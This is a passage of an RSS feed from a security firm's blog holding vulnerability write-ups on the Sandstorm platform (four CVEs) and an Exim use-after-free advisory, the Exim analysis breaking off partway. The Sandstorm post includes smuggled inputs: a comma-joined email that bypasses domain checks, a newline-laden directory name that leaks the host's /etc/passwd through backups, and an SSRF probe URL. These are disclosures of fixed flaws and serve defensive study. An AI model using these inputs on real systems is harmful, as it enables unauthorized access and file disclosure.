&lt;p&gt;在這次滲透經驗中，我們認為 Sandstorm 是一款安全、有出色防禦機制的平台。主要原因取決於它的一個核心設計理念：就是假設使用者安裝的 App 都是惡意的。以這樣的前提出發去保護核心系統的安全，建立起來的防禦機制自然是全面且完善的。除了伺服器本身的保護，一些常見的客戶端攻擊（例如：XSS、CSRF）也透過 Sandstorm 特殊的隨機 hostname 等機制保護的很好。因此攻擊者很難從 App 本身去破壞伺服器，也很難透過攻擊客戶端去提升使用者的權限。&lt;/p&gt;

&lt;p&gt;儘管是如此優秀的平台，仍舊會因一些小地方疏忽導致攻擊者有機可乘。這次發現弱點的地方多半在於 library 的誤用和新功能的撰寫沒有考慮到舊有防禦架構。這在其他專案也是常見的問題，藉機也提醒開發者在開發新功能時應做全面的安全檢視，以避免防禦落差所導致的弱點。&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/</link>
                <guid>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200</guid>
                <pubDate>Fri, 26 Jan 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Sandstorm Security Review</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/&quot;&gt;Sandstorm Security Review&lt;/a&gt; (English Version)&lt;br /&gt;
&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/&quot;&gt;一次在 Sandstorm 跳脫沙箱的滲透經驗&lt;/a&gt; (中文版本)&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;In early 2017, we had a pentesting target protected with &lt;a href=&quot;https://sandstorm.io/&quot;&gt;Sandstorm&lt;/a&gt;. Sandstorm is a web-based platform which allows users to install their web apps, such as WordPress, GitLab, etc. The main feature of Sandstorm is that it containerizes every app in its own sandbox. Therefore, even though we had found several vulnerabilities of the apps, we still could not put a threat to the server.&lt;/p&gt;

&lt;p&gt;In order to leverage the vulnerabilities, we put part of efforts into review of Sandstorm’s source codes, and tried to escape the sandbox to impact the whole server. Finally, we found a number of uncommon and interesting vulnerabilities, and received CVE IDs as follows:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2017-6198 (Denial of Service)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6199 (Bypassing Authorization Schema)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6200 (Insecure Direct Object References)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6201 (Server-Side Request Forgery)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;exploitation-details&quot;&gt;Exploitation Details&lt;/h2&gt;

&lt;h3 id=&quot;cve-2017-6198&quot;&gt;CVE-2017-6198&lt;/h3&gt;

&lt;p&gt;This is a DoS created by system resource exhaustion. The root cause is that Sandstorm does not have a comprehensive policy to limit the amount of resource used by every apps run on it. In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src/sandstorm/supervisor.c++&lt;/code&gt; only the maximum number of files opened by each process was limited. See the codes below:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SupervisorMain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setResourceLimits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rlimit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_cur&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;KJ_SYSCALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_NOFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Since supervisor does not restrict the amount of subprocesses and storage usage, attackers can raise a resource exhaustion attack to crash the server by simply uploading a malicious app which keeps calling fork() (aka the “fork bomb”) or consumes huge storage space.&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6199&quot;&gt;CVE-2017-6199&lt;/h3&gt;

&lt;p&gt;Usually Sandstorm will designate unique permissions to the specific members of a certain organization, and the default membership validation method is to check user’s email address and see whether the string after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt; exists in their white list. See the codes below:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;identity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;emailDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Therefore, when an attacker fills in an email like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; and the system will automatically consider the attacker a member of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; organization.&lt;/p&gt;

&lt;p&gt;Another key factor that contributes to the successful attack lies in one of the features when users log on Sandstorm. Users does not need to set up passwords for Sandstorm. Each time when the users need to log onto the service, they only need to fill in their email address, and they’ll receive a set of random unique password for login. The reason why the example above works is because the system treats &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; as a user from aaa.bbb domain, and the random password will be sent to the two email addresses, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ccc@aaa.bbb&lt;/code&gt; As long as one can receive the password, they can log in to use the service.&lt;/p&gt;

&lt;p&gt;Below is a quick demonstration:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;On Sandstorm, restrict access to users from domain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; only.
&lt;img src=&quot;/assets/img/blog/20180126/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;On login page, fill in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; for the email field.
(Note: at the front end, the email field is checked with HTML5 validation, but it is not further checked for validity at the back end)
&lt;img src=&quot;/assets/img/blog/20180126/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Retrieve random password in demo@devco.re mailbox.
&lt;img src=&quot;/assets/img/blog/20180126/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Login successful. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; is considered as a user and member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; organization!
&lt;img src=&quot;/assets/img/blog/20180126/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In our pentesting, the target website allowed users from validated domains to install their own apps. Therefore, through this bypass exploit, further attacks could be accomplished by combining other vulnerabilities described in this blog post (CVE-2017-6198, CVE-2017-6200, CVE-2017-6201).&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6200&quot;&gt;CVE-2017-6200&lt;/h3&gt;

&lt;p&gt;This is an interesting vulnerability. Totally two little validation flaws were exploited to initiate this attack!
On Sandstorm, owners of each Grain (Sandstorm container, in short, an app sandbox) can download their backup data for the app. But because of the two vulnerabilities in the packing process, an attacker can pack the files under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run&lt;/code&gt; directories located on the server outside the sandbox. The security issues were as follows:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;The packing process has hid &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and other sensitive directories, but did not hide &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc.host&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run.host&lt;/code&gt; these two directories. These directories are the aliases for the directories &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run&lt;/code&gt; on the server respectively, which are relatively newer features.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The system will pack the legitimate files, have them sorted out, and create zip packages through the standard input interface. The separation between files are determined by line-breaks (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\n&lt;/code&gt;). As a result, when a line-break string appears in the file name, illegal path file names can be injected and packed with zip. Although the app checks whether there is a line-break in the file name, but the directory name was not checked.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;By using these two vulnerabilities together, the attacker simply has to create a directory in the sandbox &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt; , then backup files containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; on the server can be retrieved through backup downloading function.&lt;/p&gt;

&lt;p&gt;Screenshot of a real-world scenario:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;First, create a new directory in Grain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;, and use the Grain Backup function to download the backup file.
&lt;img src=&quot;/assets/img/blog/20180126/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;After unzipping the backup file, from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;etc.host&lt;/code&gt; we’ll see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; of the server outside the sandbox.
&lt;img src=&quot;/assets/img/blog/20180126/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;cve-2017-6201&quot;&gt;CVE-2017-6201&lt;/h3&gt;

&lt;p&gt;This is a classic SSRF (Server-Side Request Forgery) issue. Sandstorm allow installation of apps from arbitrary sources, and an attacker can simply let the server access a certain location by providing an installation URL. The problem was identified on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://[target]/install/xxxChangeItEveryTimexxx?url=http://127.0.0.1:22/&lt;/code&gt; This sample link confirms whether the server’s port 22 is open.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180126/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;center&gt;(Parse Error, which implies server’s port 22 is open)&lt;/center&gt;

&lt;h2 id=&quot;follow-up-updates&quot;&gt;Follow-up Updates&lt;/h2&gt;

&lt;p&gt;After we reported the vulnerabilities, Sandstorm fixed it immediately and then published an article:
&lt;a href=&quot;https://sandstorm.io/news/2017-03-02-security-review&quot;&gt;https://sandstorm.io/news/2017-03-02-security-review&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Through this pentesting experience, we consider Sandstorm a safe platform with outstanding security mechanisms. This is mainly attributed to its fundamental design rationale: to assume that every app installed is malicious. With this vigilant assumption, Sandstorm’s defence mechanisms for the core system become comprehensive and watertight. Apart from the server-side protection, some common client-side attacks (such as XSS, CSRF) are handled properly by Sandstorm’s unique countermeasures, such as host name randomization. That is, it is very difficult for attackers to sabotage the server by simply manipulating the apps, and so does privilege escalation through attacking at the client-side.&lt;/p&gt;

&lt;p&gt;Nevertheless, such an impressive platform still had some minor mistakes which led to security issues. Most of the vulnerabilities found this time are improper usages of libraries or negligence of existing defence architecture while introducing new features. These types of vulnerability are also common in our other projects. We would like to take the opportunity to remind developers, always present a comprehensive security review especially when developing new features to avoid vulnerabilities caused by the gaps between defence mechanisms.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/</link>
                <guid>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en</guid>
                <pubDate>Fri, 26 Jan 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim RCE 資安通報 (CVE-2017-16943)</title>
                <description>&lt;h2 id=&quot;內容&quot;&gt;內容&lt;/h2&gt;

&lt;p&gt;2017/11/23 我們發現 Unix 的開源軟體 EXIM 含有 Use-After-Free 弱點（CVE-2017-16943）以及 Denial-of-Service 弱點（CVE-2017-16944），&lt;strong&gt;當 EXIM 版本是 4.88 或 4.89 並且有開啟 chunking 選項（BDAT 指令）時&lt;/strong&gt;，攻擊者可傳送特定字串給 EXIM 觸發弱點，可能造成郵件伺服器被&lt;strong&gt;遠端攻擊者入侵&lt;/strong&gt;或是&lt;strong&gt;郵件伺服器無法繼續提供服務&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;根據 E-Soft Inc. 在 11 月所做的調查，約有 57萬台（56%）的郵件伺服器使用 EXIM 軟體。建議 EXIM 的使用者檢查版本是否為 4.88 或 4.89，若是，則需修改 EXIM 的設定，將 chunking 選項&lt;strong&gt;關閉&lt;/strong&gt;（在 config 裡將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chunking_advertise_hosts&lt;/code&gt; 選項留空），或是&lt;strong&gt;更新至 4.89.1 版&lt;/strong&gt;，以避免遭受攻擊。&lt;/p&gt;

&lt;h2 id=&quot;細節&quot;&gt;細節&lt;/h2&gt;

&lt;p&gt;詳細的技術細節請參閱我們的 Advisory：
&lt;a href=&quot;https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/&quot;&gt;https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/&lt;/a&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943/</link>
                <guid>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943</guid>
                <pubDate>Mon, 11 Dec 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA</title>
                <description>&lt;p&gt;On 23 November, 2017, we reported two vulnerabilities to Exim. These bugs exist in the SMTP daemon and attackers do not need to be authenticated, including CVE-2017-16943 for a use-after-free (UAF) vulnerability, which leads to Remote Code Execution (RCE); and CVE-2017-16944 for a Denial-of-Service (DoS) vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;about-exim&quot;&gt;About Exim&lt;/h2&gt;
&lt;p&gt;Exim is a message transfer agent (MTA) used on Unix systems. Exim is an open source project and is the default MTA on Debian GNU/Linux systems. According to our survey, there are about 600k SMTP servers running exim on 21st November, 2017 (data collected from scans.io). Also, a &lt;a href=&quot;http://www.securityspace.com/s_survey/data/man.201710/mxsurvey.html&quot;&gt;mail server survey&lt;/a&gt; by E-Soft Inc. shows over half of the mail servers identified are running exim.&lt;/p&gt;

&lt;h2 id=&quot;affected&quot;&gt;Affected&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Exim version 4.88 &amp;amp; 4.89 with chunking option enabled.&lt;/li&gt;
  &lt;li&gt;According to our survey, about 150k servers affected on 21st November, 2017 (data collected from scans.io).&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;vulnerability-details&quot;&gt;Vulnerability Details&lt;/h2&gt;
&lt;p&gt;Through our research, the following vulnerabilies were discovered in Exim. Both vulnerabilies involve in BDAT command. BDAT is an extension in SMTP protocol, which is used to transfer large and binary data. A BDAT command is like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BDAT 1024&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BDAT 1024 LAST&lt;/code&gt;. With the SIZE and LAST declared, mail servers do not need to scan for the end dot anymore. This command was introduced to exim in version 4.88, and also brought some bugs.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Use-after-free in receive_msg leads to RCE (CVE-2017-16943)&lt;/li&gt;
  &lt;li&gt;Incorrect BDAT data handling leads to DoS  (CVE-2017-16944)&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;use-after-free-in-receive_msg-leads-to-rce&quot;&gt;Use-after-free in receive_msg leads to RCE&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h3&gt;
&lt;p&gt;To explain this bug, we need to start with the memory management of exim. There is a series of functions starts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_&lt;/code&gt; such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_release&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset&lt;/code&gt;. These functions are used to manage dynamically allocated memory and improve performance. Its architecture is like the illustration below:
&lt;img src=&quot;/assets/img/blog/20171211/1.png&quot; alt=&quot;architecture of storeblock&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Initially, exim allocates a big storeblock (default 0x2000) and then cut it into &lt;strong&gt;stores&lt;/strong&gt; when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; is called, using global pointers to record the size of unused memory and where to cut in next allocation. Once the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; is insufficient, it allocates a new block and appends it to the end of the chain, which is a linked list, and then makes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; point to it. Exim maintains three &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_pool&lt;/code&gt;, that is, there are three chains like the illustration above and every global variables are actually arrays.
This vulnerability is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt; where exim reads headers: 
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1817&quot;&gt;receive.c: 1817 receive_msg&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* header_size += 256; */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_extend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;store_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It seems normal if the store functions are just like realloc, malloc and free. However, they are different and cannot be used in this way. When exim tries to &lt;strong&gt;extend&lt;/strong&gt; store, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_extend&lt;/code&gt; checks whether the old store is the latest store allocated in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;. It returns False immediately if the check is failed.
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/store.c#L276&quot;&gt;store.c: 276 store_extend&lt;/a&gt;&lt;/p&gt;
